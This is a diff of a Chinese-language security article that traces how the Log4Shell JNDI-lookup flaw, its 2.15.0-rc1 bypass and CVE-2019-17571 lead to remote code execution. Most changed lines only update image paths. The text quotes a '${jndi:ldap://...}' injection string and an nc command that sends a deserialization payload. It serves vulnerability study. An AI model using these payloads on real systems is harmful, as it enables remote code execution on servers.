@@ -184,7 +184,7 @@ public StringBuilder toSerializable(final LogEvent event, final StringBuilder bu
 }
 ```
 
-[![](assets/1700545019-fbc3bae9b7d790d2a1fa197d4d61b45b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120131941-6844040a-8764-1.png)
+[![](assets/1700701330-fbc3bae9b7d790d2a1fa197d4d61b45b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120131941-6844040a-8764-1.png)
 
 代码断在i为8的时候，formatters\[8\]是一个MessagePatternConverter对象，调用其format方法
 
@@ -265,9 +265,9 @@ public void format(final LogEvent event, final StringBuilder toAppendTo) {
 ```
 
 在执行formatTo方法之前  
-[![](assets/1700545019-8bfd49ae38a5de00946357ad9916c128.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132003-759c6d36-8764-1.png)  
+[![](assets/1700701330-8bfd49ae38a5de00946357ad9916c128.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132003-759c6d36-8764-1.png)  
 执行完formatTo方法之后  
-[![](assets/1700545019-c5a4f9c6ecdb17e7f218e926e9d13e60.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132020-7f7e8bb8-8764-1.png)  
+[![](assets/1700701330-c5a4f9c6ecdb17e7f218e926e9d13e60.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132020-7f7e8bb8-8764-1.png)  
 也就是说msg的formatTo方法是一个格式化的过程，将格式化的内容添加到workingBuilder中，也就是将源代码中的message替换{}  
 接下来进入for循环，这里主要判断在workingBuilder中是否存在${}格式的占位符，如果存在，就调用config.getStrSubstitutor().replace(event, value)方法进行替换  
 首先进入config.getStrSubstitutor()，进入的是AbstractConfiguration类
@@ -279,7 +279,7 @@ public StrSubstitutor getStrSubstitutor() {
 }
 ```
 
-[![](assets/1700545019-8321dd0957d72f6e1a65fd7f636d5146.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120134117-6d124e3a-8767-1.png)  
+[![](assets/1700701330-8321dd0957d72f6e1a65fd7f636d5146.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120134117-6d124e3a-8767-1.png)  
 进入StrSubstitutor类的replace方法
 
 ```plain
@@ -297,7 +297,7 @@ public String replace(final LogEvent event, final String source) {
 }
 ```
 
-[![](assets/1700545019-39495e2ddc74a63a036f70920853ce5f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132043-8dc2d04e-8764-1.png)  
+[![](assets/1700701330-39495e2ddc74a63a036f70920853ce5f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132043-8dc2d04e-8764-1.png)  
 跳过中间的步骤来到StrSubstitutor类的substitute方法，这个方法用于多级插值的递归处理程序。这是主要的插值方法，用于解析传入文本中包含的所有变量引用的值。  
 这里有一个大的while循环，pos从0开始，从左到右遍历buf，chars的值为“error info:${jndi:ldap://127.0.0.1:1389/0xrsto}”
 
@@ -323,7 +323,7 @@ while (pos < bufEnd) {
 }
 ```
 
-[![](assets/1700545019-17b3daf2fa025865ce91ad4e803b18bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132102-98872656-8764-1.png)  
+[![](assets/1700701330-17b3daf2fa025865ce91ad4e803b18bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132102-98872656-8764-1.png)  
 当pos为11的时候能够满足两个if条件(存在"${")，进入else  
 else里面又存在一个while循环
 
@@ -353,9 +353,9 @@ while (pos < bufEnd) {
 }
 ```
 
-[![](assets/1700545019-a4f67b3e677ec4f64e87ddbea9af2615.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132119-a322e898-8764-1.png)  
+[![](assets/1700701330-a4f67b3e677ec4f64e87ddbea9af2615.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132119-a322e898-8764-1.png)  
 这里是寻找后缀，即“}”，然后提取出中间的字符串“jndi:ldap://127.0.0.1:1389/0xrsto”，进入else中，进入这里  
-[![](assets/1700545019-8f1a5112e1715f48cac1bc63bdf10677.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132141-afe43c3a-8764-1.png)  
+[![](assets/1700701330-8f1a5112e1715f48cac1bc63bdf10677.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132141-afe43c3a-8764-1.png)  
 进入StrSubstitutor类resolveVariable方法
 
 ```plain
@@ -370,7 +370,7 @@ protected String resolveVariable(final LogEvent event, final String variableName
 }
 ```
 
-[![](assets/1700545019-9a8e074eeb271ebfd162321bd453b73a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132210-c16dcbb0-8764-1.png)
+[![](assets/1700701330-9a8e074eeb271ebfd162321bd453b73a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132210-c16dcbb0-8764-1.png)
 
 这个方法用于解析变量值的内部方法，进入Interpolator中的lookup方法
 
@@ -412,7 +412,7 @@ public String lookup(final LogEvent event, String var) {
 }
 ```
 
-[![](assets/1700545019-e1538a22213b605ab23ae8495b86ddc5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132230-cd17fe5e-8764-1.png)  
+[![](assets/1700701330-e1538a22213b605ab23ae8495b86ddc5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132230-cd17fe5e-8764-1.png)  
 在strLookupMap中键名为"jndi"的值为JndiLookup对象，进入JndiLookup类的lookup方法
 
 ```plain
@@ -432,9 +432,9 @@ public String lookup(final LogEvent event, final String key) {
 }
 ```
 
-[![](assets/1700545019-bddeaa92c8a3b6809d510ae2a495482e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132249-d884e518-8764-1.png)  
+[![](assets/1700701330-bddeaa92c8a3b6809d510ae2a495482e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132249-d884e518-8764-1.png)  
 进入JndiManager类的lookup方法  
-[![](assets/1700545019-12267384fd15557323bfb980f21cda13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132307-e377f7a8-8764-1.png)  
+[![](assets/1700701330-12267384fd15557323bfb980f21cda13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132307-e377f7a8-8764-1.png)  
 这里的context是InitialContext对象，调用其lookup方法，下面就是JNDI中的链了
 
 ### 代码关键点
@@ -503,7 +503,7 @@ public void logIfEnabled(final String fqcn, final Level level, final Marker mark
 ```
 
 跳过中间一步来到Logger类的filter方法  
-[![](assets/1700545019-ee0e6ccd49c14be0db63c71776d65b09.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132621-572936da-8765-1.png)  
+[![](assets/1700701330-ee0e6ccd49c14be0db63c71776d65b09.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132621-572936da-8765-1.png)  
 很显然返回的是false，从而在logIfEnabled中不会调用logMessage方法
 
 问题：intLevel从哪里来的？  
@@ -546,7 +546,7 @@ log4j的默认配置文件如下：
 </Configuration>
 ```
 
-[![](assets/1700545019-02914896acbfb697fa4f70c100717839.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132643-63e98f1e-8765-1.png)  
+[![](assets/1700701330-02914896acbfb697fa4f70c100717839.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132643-63e98f1e-8765-1.png)  
 能够成功过这个条件，从而导致RCE  
 至于配置文件的加载来自于LogManager.getLogger(...)，这里不再赘述
 
@@ -562,7 +562,7 @@ log4j的默认配置文件如下：
 2.15.0-rc1版本对前面存在的问题进行了修复，主要有以下：  
 **第一**：  
 对应前一节代码关键点的第一点，在toSerializable方法处调用的不再是MessagePatternConverter的format方法，而是SimpleMessagePatternConverter的format方法  
-[![](assets/1700545019-23369f189559eb8783f2502a48aa984a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132710-73e2ac66-8765-1.png)
+[![](assets/1700701330-23369f189559eb8783f2502a48aa984a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132710-73e2ac66-8765-1.png)
 
 查看SimpleMessagePatternConverter的format方法：
 
@@ -666,8 +666,8 @@ public synchronized <T> T lookup(final String name) throws NamingException {
 }
 ```
 
-[![](assets/1700545019-a4d0ce389358ed9cdade702397cafe10.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132748-8a835060-8765-1.png)  
-[![](assets/1700545019-cdec70cb164eebe77f08ac5797880914.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132804-94529d80-8765-1.png)
+[![](assets/1700701330-a4d0ce389358ed9cdade702397cafe10.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132748-8a835060-8765-1.png)  
+[![](assets/1700701330-cdec70cb164eebe77f08ac5797880914.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132804-94529d80-8765-1.png)
 
 而这里jndiManager对象的构造来自于JndiLookup类中的lookup方法中的如下代码：
 
@@ -860,10 +860,10 @@ private static boolean loadLookups(final String[] options) {
 }
 ```
 
-[![](assets/1700545019-172d592242d97b118f2e3c3090b84824.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132832-a4bb0a7c-8765-1.png)
+[![](assets/1700701330-172d592242d97b118f2e3c3090b84824.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132832-a4bb0a7c-8765-1.png)
 
 回到MessagePatternConverter实例化函数，由于lookups为true，所以构造LookupMessagePatternConverter  
-[![](assets/1700545019-438d35b55aa8e646d743aab51d82ce0d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132848-ae4c6176-8765-1.png)
+[![](assets/1700701330-438d35b55aa8e646d743aab51d82ce0d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132848-ae4c6176-8765-1.png)
 
 函数调用栈：
 
@@ -906,7 +906,7 @@ getLogger:599, LogManager (org.apache.logging.log4j)
 
 **第二**：  
 接下来进入到测试代码的主函数中，还是回到第一个关键点toSerializable方法，此时的convert是计划中的LookupMessagePatternConverter  
-[![](assets/1700545019-77b8d7c978aa0a0d4c01dd4a0a8c12bf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132907-b9f67034-8765-1.png)
+[![](assets/1700701330-77b8d7c978aa0a0d4c01dd4a0a8c12bf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132907-b9f67034-8765-1.png)
 
 进入LookupMessagePatternConverter的format方法，这里会寻找"${"，并且进行替换操作
 
@@ -925,7 +925,7 @@ public void format(final LogEvent event, final StringBuilder toAppendTo) {
     }
 ```
 
-[![](assets/1700545019-fafbb6e5aea35ac25ac69a003f22310a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132925-c47707d0-8765-1.png)
+[![](assets/1700701330-fafbb6e5aea35ac25ac69a003f22310a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132925-c47707d0-8765-1.png)
 
 **第三**：  
 跳过中间的步骤，来到JndiLookup的lookup方法处，获取JndiManager对象的操作前面已经讲了，接下来就是进入其lookup方法
@@ -941,14 +941,14 @@ URI uri = new URI(name);
 ```
 
 然后执行最后的lookup操作，lookup会自动去掉空格，从而导致RCE  
-[![](assets/1700545019-e412fca322b05d2cab078883f94d6718.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132943-cf38e314-8765-1.png)
+[![](assets/1700701330-e412fca322b05d2cab078883f94d6718.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120132943-cf38e314-8765-1.png)
 
 ## log4j-2.15.0-rc2分析
 
 github commit地址：[https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658](https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658)
 
 该commit修补了rc1带来的缺陷，在URISyntaxException异常的空缺块上加了return处理，这样就不会是使程序执行至最后一行  
-[![](assets/1700545019-ce91ec6534a5ba961106bcf1fee2c4b2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133000-d984e11a-8765-1.png)
+[![](assets/1700701330-ce91ec6534a5ba961106bcf1fee2c4b2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133000-d984e11a-8765-1.png)
 
 ## 落幕
 
@@ -957,7 +957,7 @@ github commit地址：[https://github.com/apache/logging-log4j2/commit/bac0d8a35
 
 在2.15.1-rc1中，默认禁用jndi  
 在2.16.0中，完全移除了lookup功能，修改了MessagePatternConverter实例化中的逻辑，并且删除了LookupMessagePatternConverter这个内部类  
-[![](assets/1700545019-040daa93a9b5bc794a7a5629941b7451.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133018-e438f2e0-8765-1.png)
+[![](assets/1700701330-040daa93a9b5bc794a7a5629941b7451.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133018-e438f2e0-8765-1.png)
 
 ## SimpleSocketServer(CVE-2019-17571)
 
@@ -1064,7 +1064,7 @@ run:745, Thread (java.lang)
 ### 详细分析
 
 将断点下在SimpleSocketServer类的main方法中  
-[![](assets/1700545019-dbe536c56589e91e46c526b618c91fc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133043-f344eda2-8765-1.png)
+[![](assets/1700701330-dbe536c56589e91e46c526b618c91fc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133043-f344eda2-8765-1.png)
 
 进入main函数
 
@@ -1106,7 +1106,7 @@ cat cve201917571| nc 127.0.0.1 4444
 ```
 
 此时accept成功接收到一个客户端的连接  
-[![](assets/1700545019-b264ff2e62d388987b7b468aac043734.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133100-fd4054f4-8765-1.png)
+[![](assets/1700701330-b264ff2e62d388987b7b468aac043734.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133100-fd4054f4-8765-1.png)
 
 主要看创建线程的代码，里面参数中new了一个SocketNode对象，进入
 
@@ -1129,7 +1129,7 @@ public SocketNode(Socket socket, LoggerRepository hierarchy) {
 }
 ```
 
-[![](assets/1700545019-94f7d82c6dc6422fcaa62ec20fb5aa5a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133119-0882effc-8766-1.png)
+[![](assets/1700701330-94f7d82c6dc6422fcaa62ec20fb5aa5a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133119-0882effc-8766-1.png)
 
 跳出之后，主线程的新建一个子线程，并传递刚刚获取的SocketNode对象，并调用线程的启动函数strat
 
@@ -1174,7 +1174,7 @@ public void run() {
 }
 ```
 
-[![](assets/1700545019-f1fc9edf851e25adaffd5029353d0c2f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133138-13f849f4-8766-1.png)  
+[![](assets/1700701330-f1fc9edf851e25adaffd5029353d0c2f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231120133138-13f849f4-8766-1.png)  
 此时的ois正是由CC1链构造的恶意payload，能够导致RCE，接下来就是CC1链中的过程
 
 ## 总结
